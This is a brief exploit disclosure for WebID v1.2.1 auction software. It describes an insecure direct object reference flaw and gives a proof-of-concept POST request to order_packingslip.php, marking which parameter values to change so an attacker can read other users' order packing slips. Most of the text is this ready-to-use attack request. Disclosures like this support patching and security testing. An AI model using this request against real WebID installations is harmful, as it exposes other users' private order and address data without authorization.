# Exploit Title: Webid v1.2.1 - Insecure Direct Object Reference(IDOR)
## Date: 2/1/2024
## Vendor Homepage: https://sourceforge.net/projects/simpleauction/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Webid
## Version: v1.2.1
## Exploit Description:
## Webid v1.2.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to view every order packing slip that is owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /order_packingslip.php HTTP/1.1
...

csrftoken=5464f3f46746c5b6438a31d8b8f8d548&pfval=4(CHANGE HERE)&pfwon=3(CHANGE HERE)&user_id=4
```